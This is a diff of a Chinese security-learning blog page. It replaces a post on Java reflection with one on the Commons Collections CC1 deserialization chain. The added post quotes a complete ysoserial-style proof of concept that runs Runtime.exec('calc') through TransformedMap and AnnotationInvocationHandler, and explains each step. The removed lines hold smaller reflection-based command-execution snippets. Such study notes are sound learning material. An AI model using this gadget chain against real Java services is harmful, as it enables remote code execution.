@@ -4,7 +4,7 @@
   <!-- 元数据 -->
   <meta charset="utf-8">
   <link rel="icon" href="images/favicon.ico">
-  <title>java反射学习-2 | fmyyy</title>
+  <title>java反序列化CC1-2 | fmyyy</title>
   <meta name="author" content="fmyyy" />
   <meta http-equiv="Cache-Control" content="no-transform" />
   <meta http-equiv="Cache-Control" content="no-siteapp" />
@@ -15,16 +15,16 @@
   
     <meta name="keywords" content="" />
   
-  <meta name="description" content="上一篇学完了反射的基础，接下来深入学习一下。 在正常情况下，除了系统类，如果我们想拿到一个类，需要先 import 才能使用。而使用forName就不 需要，这样对于我们的攻击者来说就十分有利，我们可以加载任意类 同时，forName()还可以获取内部类 我们通过forName获得类之后用newInstance()来调用这个类的无参构造函数，但有时这个方法会失败，原因可能是：  你使用的类没有无参">
+  <meta name="description" content="上一篇命令执行是我们手动触发的put方法进行添加新元素，那么真正的反序列化poc呢？看看p神给的poc 123456789101112131415161718192021222324252627282930313233343536373839404142package ysoserial.payloads;import org.apache.commons.collections.Transfo">
 <meta property="og:type" content="article">
-<meta property="og:title" content="java反射学习-2">
-<meta property="og:url" content="https://fmyyy.gitee.io/2021/08/26/java%E5%8F%8D%E5%B0%84%E5%AD%A6%E4%B9%A0-2/index.html">
+<meta property="og:title" content="java反序列化CC1-2">
+<meta property="og:url" content="https://fmyyy.gitee.io/2021/09/02/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1-2/index.html">
 <meta property="og:site_name" content="fmyyy">
-<meta property="og:description" content="上一篇学完了反射的基础，接下来深入学习一下。 在正常情况下，除了系统类，如果我们想拿到一个类，需要先 import 才能使用。而使用forName就不 需要，这样对于我们的攻击者来说就十分有利，我们可以加载任意类 同时，forName()还可以获取内部类 我们通过forName获得类之后用newInstance()来调用这个类的无参构造函数，但有时这个方法会失败，原因可能是：  你使用的类没有无参">
+<meta property="og:description" content="上一篇命令执行是我们手动触发的put方法进行添加新元素，那么真正的反序列化poc呢？看看p神给的poc 123456789101112131415161718192021222324252627282930313233343536373839404142package ysoserial.payloads;import org.apache.commons.collections.Transfo">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://fmyyy.gitee.io/images/favicon.ico">
-<meta property="article:published_time" content="2021-08-26T13:14:04.000Z">
-<meta property="article:modified_time" content="2021-09-22T01:19:26.203Z">
+<meta property="article:published_time" content="2021-09-02T13:14:04.000Z">
+<meta property="article:modified_time" content="2021-09-22T01:29:43.969Z">
 <meta property="article:author" content="fmyyy">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://fmyyy.gitee.io/images/favicon.ico">
@@ -171,17 +171,17 @@
     <div class="kratos-hentry kratos-post-inner clearfix">
         <header class="kratos-entry-header">
             
-                <h1 class="kratos-entry-title text-center">java反射学习-2</h1>
+                <h1 class="kratos-entry-title text-center">java反序列化CC1-2</h1>
             
             
             <ul class="kratos-post-meta text-center">
-                <li><i class="fa fa-calendar"></i> 2021-08-26</li>
+                <li><i class="fa fa-calendar"></i> 2021-09-02</li>
                 <li><i class="fa fa-user"></i> 作者 fmyyy</li>
                 <li>
                     <i class="fa fa-edit"></i> 
                     
                     
-                        ~1.73K
+                        ~3.32K
                     
                     字
                 </li>
@@ -190,24 +190,26 @@
         </header>
         <div class="kratos-post-content">
             <div id="expire-alert" class="alert alert-warning hidden" role="alert">
-                本文最后编辑于 <time datetime="1632273566203"></time> 前，其中的内容可能需要更新。
+                本文最后编辑于 <time datetime="1632274183969"></time> 前，其中的内容可能需要更新。
             </div>
             
+                <div class="kratos-post-inner-toc">
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#sun-reflect-annotation-AnnotationInvocationHandler"><span class="toc-number">1.</span> <span class="toc-text">sun.reflect.annotation.AnnotationInvocationHandler</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E5%8F%8D%E5%B0%84%E7%9A%84%E9%97%AE%E9%A2%98"><span class="toc-number">2.</span> <span class="toc-text">关于反射的问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">总结</span></a></li></ol>
+                </div>
+            
             <hr />
-            <p>上一篇学完了反射的基础，接下来深入学习一下。</p>
-<p>在正常情况下，除了系统类，如果我们想拿到一个类，需要先 import 才能使用。而使用forName就不 需要，这样对于我们的攻击者来说就十分有利，我们可以加载任意类</p>
-<p>同时，forName()还可以获取内部类</p>
-<p>我们通过forName获得类之后用newInstance()来调用这个类的无参构造函数，但有时这个方法会失败，原因可能是：</p>
-<ol>
-<li>你使用的类没有无参构造函数</li>
-<li>你使用的类构造函数是私有的<br>常见的情况就是 java.lang.Runtime ，这个类在我们构造命令执行Payload的时候很常见，但 我们不能直接这样来执行命令：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>); clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(clazz.newInstance(), <span class="string">&quot;id&quot;</span>);</span><br></pre></td></tr></table></figure>
-因为Runtime类的构造方法是私有的。<br>但还是有方法获取到这个类的，这涉及到单例模式。<br>比如，对于Web应用来说，数据库连接只需要建立一次，而不是每次用到数据库的时候再新建立一个连 接，此时作为开发者你就可以将数据库连接使用的类的构造函数设置为私有，然后编写一个静态方法来 获取：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TrainDB</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> TrainDB instance = <span class="keyword">new</span> TrainDB();</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> TrainDB <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> instance;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">TrainDB</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="comment">// 建立连接的代码...</span></span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
-之后获取这个类的方法为getInstance。<br>Runtime类就是单例模式，我们只能通过 Runtime.getRuntime() 来获取到 Runtime 对 象。我们将上述Payload进行修改即可正常执行命令了：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>); </span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(clazz), <span class="string">&quot;calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure></li>
-</ol>
-<p>Runtime.exec有6个重载，第一个重载，它只有一个参数，类型是String，所以我们使用 getMethod(“exec”, String.class) 来获取 Runtime.exec 方法。<br>invoke 的作用是执行方法，它的第一个参数是：<br>1.如果这个方法是一个普通方法，那么第一个参数是类对象<br>2.如果这个方法是一个静态方法，那么第一个参数是类</p>
-<p>这也比较好理解了，我们正常执行方法是 [1].method([2], [3], [4]…) ，其实在反射里就是 method.invoke([1], [2], [3], [4]…) 。</p>
-<p>所以我们将上述命令执行的Payload分解一下就是：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">Method execMethod = clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">Method getRuntimeMethod = clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>);<span class="comment">//获取getRuntime方法</span></span><br><span class="line">Object runtime = getRuntimeMethod.invoke(clazz);<span class="comment">//执行getRuntime方法获取Runtime对象</span></span><br><span class="line">execMethod.invoke(runtime, <span class="string">&quot;calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure>
+            <p>﻿上一篇命令执行是我们手动触发的put方法进行添加新元素，那么真正的反序列化poc呢？<br>看看p神给的poc</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonCollections1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> String[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        construct.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(handler);</span><br><span class="line">        oos.close();</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        Object o = (Object) ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>不过这个poc我本地算是弹失败了，因为java版本的原因，在Java 8u71以后的版本中，由于 sun.reflect.annotation.AnnotationInvocationHandler 发生了变化导致不再可用。我的版本正好是8u71。<br>不过我来学习思路，也懒的改版本了。</p>
+<h2 id="sun-reflect-annotation-AnnotationInvocationHandler"><a href="#sun-reflect-annotation-AnnotationInvocationHandler" class="headerlink" title="sun.reflect.annotation.AnnotationInvocationHandler"></a>sun.reflect.annotation.AnnotationInvocationHandler</h2><p>触发这个漏洞的核心，在于我们需要向Map中加入一个新的元素。在demo中，我们可 以手工执行 outerMap.put(“test”, “xxxx”); 来触发漏洞，但在实际反序列化时，我们需要找到一个 类，它在反序列化的readObject逻辑里有类似的写入操作。<br>这个类就是 sun.reflect.annotation.AnnotationInvocationHandler<br>源码就不放了，逻辑就是调用了setValue方法，这个方法也能触发TransformedMap里注册的<br>Transform。</p>
+<h2 id="关于反射的问题"><a href="#关于反射的问题" class="headerlink" title="关于反射的问题"></a>关于反射的问题</h2><p>看到前面我们生产Runtime类的时候是直接调用getRuntime方法的<br>[<img src="https://img-blog.csdnimg.cn/img_convert/5d12afa2cd8fbf46ca0f305c5210fbe3.png"></p>
+<p>但这次的poc不一样，是利用反射调用的</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/5f88e181dadd76d98e0d386aad425ca2.png"></p>
+<p>这里涉及到反序列化的条件。<br>1、该类必须直接实现java.io.Serializable接口或者间接从其继承树中实现该接口(也就是他的某个父类实现了这个接口);<br>2、对于该类的所有无法序列化的属性(本文指字段field, 而不是严格意义上的属性property, 下同)必须使用transient修饰。</p>
+<p>但Runtime类是没有实现java.io.Serializable接口的，所以不能直接反序列化，但反射能解决这个问题，将 Runtime.getRuntime() 换成了 Runtime.class ，前者是一个<br>java.lang.Runtime 对象，后者是一个 java.lang.Class 对象。Class类有实现Serializable接口，所以可以被序列化。</p>
+<p>但是AnnotationInvocationHandler 也不能直接实例化，仍然需要利用反射的机制</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>真累，接下来是CC1的LazyMap，比起TransformedMap似乎LazyMap用的更多</p>
+
         </div>
         
             <div class="kratos-copyright text-center clearfix">
@@ -260,7 +262,7 @@
     <script type="text/javascript">
         $(()=>{
             new QRCode("wechat-qr", {
-                text: "https://fmyyy.gitee.io/2021/08/26/java%E5%8F%8D%E5%B0%84%E5%AD%A6%E4%B9%A0-2/",
+                text: "https://fmyyy.gitee.io/2021/09/02/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1-2/",
                 width: 150,
                 height: 150,
                 correctLevel : QRCode.CorrectLevel.H
@@ -272,11 +274,10 @@
             const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
             const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
             const twitterBase   = "https://twitter.com/intent/tweet?";
-            const hostUrl       = "https://fmyyy.gitee.io/2021/08/26/java%E5%8F%8D%E5%B0%84%E5%AD%A6%E4%B9%A0-2/";
-            const title         = "「java反射学习-2」";
-            const excerpt       = `上一篇学完了反射的基础，接下来深入学习一下。
-在正常情况下，除了系统类，如果我们想拿到一个类，需要先 import 才能使用。而使用forName就不 需要，这样对于我们的攻击者来说就十分有利，我们可以加载任意类
-同时，forName...`;
+            const hostUrl       = "https://fmyyy.gitee.io/2021/09/02/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1-2/";
+            const title         = "「java反序列化CC1-2」";
+            const excerpt       = `﻿上一篇命令执行是我们手动触发的put方法进行添加新元素，那么真正的反序列化poc呢？看看p神给的poc
+1234567891011121314151617181920212223242526272829303132333435363...`;
             let _URL;
             switch (dest) {
                 case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
@@ -307,12 +308,12 @@
         <nav class="navigation post-navigation clearfix" role="navigation">
             
             <div class="nav-previous clearfix">
-                <a title=" java反射学习-1" href="/2021/08/25/java反射学习-1/">&lt; 上一篇</a>
+                <a title=" java反序列化CC6" href="/2021/09/02/java反序列化 CC6/">&lt; 上一篇</a>
             </div>
             
             
             <div class="nav-next clearfix">
-                <a title=" java反射学习-3" href="/2021/08/29/java反射学习-3/">下一篇 &gt;</a>
+                <a title=" java反序列化CC1-3" href="/2021/09/02/java反序列化CC1-3/">下一篇 &gt;</a>
             </div>
             
         </nav>
@@ -346,6 +347,18 @@
 </aside>
             
                     <div class="sticky-area">
+                
+                    <aside id="krw-toc" class="widget widget-kratos-toc clearfix">
+    <div class="photo-background"></div>
+    <h4 class="widget-title no-after">
+        <i class="fa fa-compass"></i>
+        文章目录
+        <span class="toc-progress-bar"></span>
+    </h4>
+    <div class="textwidget">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#sun-reflect-annotation-AnnotationInvocationHandler"><span class="toc-text">sun.reflect.annotation.AnnotationInvocationHandler</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E5%8F%8D%E5%B0%84%E7%9A%84%E9%97%AE%E9%A2%98"><span class="toc-text">关于反射的问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol>
+    </div>
+</aside>
                 
                     <div class="sticky-area">
                 
